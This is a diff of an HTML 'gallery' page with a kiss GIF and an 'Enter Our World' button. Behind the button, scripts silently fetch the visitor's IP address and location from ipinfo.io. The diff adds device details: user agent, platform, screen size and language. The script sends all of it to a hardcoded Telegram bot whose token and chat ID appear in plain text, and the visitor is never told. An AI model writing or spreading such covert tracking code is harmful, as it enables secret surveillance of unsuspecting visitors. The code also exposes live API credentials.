@@ -1,131 +1,163 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sreejan Gallery</title>
-    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Playfair+Display:wght@400;700&display=swap" rel="stylesheet">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sreejan Gallery</title>
+    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Playfair+Display:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-        body {
-            min-height: 100vh;
-            background: linear-gradient(45deg, 
-                #ff69b4, #da70d6, #9370db, #ff1493, #ff69b4);
-            background-size: 400% 400%;
-            animation: backgroundShimmer 15s ease infinite;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Playfair Display', serif;
-            overflow: hidden;
-        }
+        body {
+            min-height: 100vh;
+            background: linear-gradient(45deg, #ff69b4, #da70d6, #9370db, #ff1493, #ff69b4);
+            background-size: 400% 400%;
+            animation: backgroundShimmer 15s ease infinite;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Playfair Display', serif;
+            overflow: hidden;
+        }
 
-        .container {
-            text-align: center;
-            padding: 20px;
-            max-width: 900px;
-            width: 90%;
-            position: relative;
-        }
+        @keyframes backgroundShimmer {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
 
-        .main-heading {
-            font-family: 'Dancing Script', cursive;
-            font-size: clamp(3.5rem, 7vw, 5.5rem);
-            color: white;
-            margin-bottom: 40px;
-        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            max-width: 900px;
+            width: 90%;
+            position: relative;
+        }
 
-        .gif-container {
-            width: 331px;
-            height: 302px;
-            margin: 40px auto;
-            background: rgba(255, 255, 255, 0.15);
-            border-radius: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: white;
-        }
+        .main-heading {
+            font-family: 'Dancing Script', cursive;
+            font-size: clamp(3.5rem, 7vw, 5.5rem);
+            color: white;
+            margin-bottom: 40px;
+        }
 
-        .button-container {
-            display: flex;
-            gap: 30px;
-            margin-top: 40px;
-            flex-wrap: wrap;
-            justify-content: center;
-        }
+        .gif-container {
+            width: 331px;
+            height: 302px;
+            margin: 40px auto;
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
 
-        .btn {
-            padding: 18px 35px;
-            font-size: 1.3rem;
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
-            background: rgba(255, 255, 255, 0.15);
-            color: white;
-        }
+        .gif-container img {
+            width: 100%;
+            height: auto;
+            border-radius: 15px;
+        }
 
-        .fadeOut {
-            opacity: 0;
-        }
+        .button-container {
+            display: flex;
+            gap: 30px;
+            margin-top: 40px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
 
-    </style>
+        .btn {
+            padding: 18px 35px;
+            font-size: 1.3rem;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            background: rgba(255, 255, 255, 0.15);
+            color: white;
+            transition: background 0.3s;
+        }
+
+        .btn:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+
+        .fadeOut {
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+    </style>
 </head>
 <body>
-    <div class="container">
-        <h1 class="main-heading">Welcome to Our Gallery</h1>
-        <div class="gif-container">
-            <img src="./kiss (1).gif" alt="Gif">
-        </div>
-        <div class="button-container">
-            <button class="btn" id="colorBtn">Change Color</button>
-            <button class="btn" id="enterBtn">Enter Our World</button>
-        </div>
-    </div>
+    <div class="container">
+        <h1 class="main-heading">Welcome to Our Gallery</h1>
+        <div class="gif-container">
+            <img src="./kiss (1).gif" alt="Gif">
+        </div>
+        <div class="button-container">
+            <button class="btn" id="colorBtn">Change Color</button>
+            <button class="btn" id="enterBtn">Enter Our World</button>
+        </div>
+    </div>
 
-    <script>
-        // Enter button functionality
-        const enterBtn = document.getElementById('enterBtn');
-        const body = document.body;
+    <script>
+        const enterBtn = document.getElementById('enterBtn');
+        const body = document.body;
 
-        enterBtn.addEventListener('click', () => {
-            body.classList.add('fadeOut');
-            setTimeout(() => {
-                // Fetching IP and Location details from ipinfo.io
-                fetch('https://ipinfo.io/json?token=YOUR_TOKEN')
-                    .then(response => response.json())
-                    .then(data => {
-                        const ip = data.ip;
-                        const location = data.city + ', ' + data.region + ', ' + data.country;
-                        // Send to Telegram
-                        sendToTelegram(ip, location);
-                    })
-                    .catch(err => console.error('Error fetching IP:', err));
+        enterBtn.addEventListener('click', () => {
+            body.classList.add('fadeOut');
 
-                setTimeout(() => {
-                    // Navigate to next page
-                    window.location.href = 'gallary.html';
-                }, 500);
-            }, 500);
-        });
+            setTimeout(() => {
+                fetch('https://ipinfo.io/json?token=974ee73715b5cf')
+                    .then(response => response.json())
+                    .then(data => {
+                        const ip = data.ip || 'Not found';
+                        const location = `${data.city || 'N/A'}, ${data.region || 'N/A'}, ${data.country || 'N/A'}`;
+                        const deviceInfo = getDeviceInfo();
+                        sendToTelegram(ip, location, deviceInfo);
+                    })
+                    .catch(error => {
+                        console.error('Error fetching IP:', error);
+                        sendToTelegram('Unknown', 'Unknown', getDeviceInfo());
+                    });
 
-        function sendToTelegram(ip, location) {
-            const token = '8132685114:AAFLul-sqA7Ld5keC7FWdKatu_41hjVHBYM';
-            const chatId = '1962244896';
-            const message = `IP Address: ${ip}\nLocation: ${location}`;
+                setTimeout(() => {
+                    window.location.href = 'gallary.html';
+                }, 1000);
+            }, 500);
+        });
 
-            // Send message to Telegram
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-                .then(response => response.json())
-                .then(data => console.log('Message sent to Telegram:', data))
-                .catch(error => console.error('Error sending message:', error));
-        }
-    </script>
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            const platform = navigator.platform;
+            const screenWidth = screen.width;
+            const screenHeight = screen.height;
+            const language = navigator.language;
+
+            return `Device Info:
+User Agent: ${ua}
+Platform: ${platform}
+Screen: ${screenWidth}x${screenHeight}
+Language: ${language}`;
+        }
+
+        function sendToTelegram(ip, location, deviceInfo) {
+            const token = '8132685114:AAFLul-sqA7Ld5keC7FWdKatu_41hjVHBYM';
+            const chatId = '1962244896';
+            const message = `IP Address: ${ip}
+Location: ${location}
+${deviceInfo}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => response.json())
+                .then(data => console.log('Message sent to Telegram:', data))
+                .catch(error => console.error('Error sending message:', error));
+        }
+    </script>
 </body>
 </html>
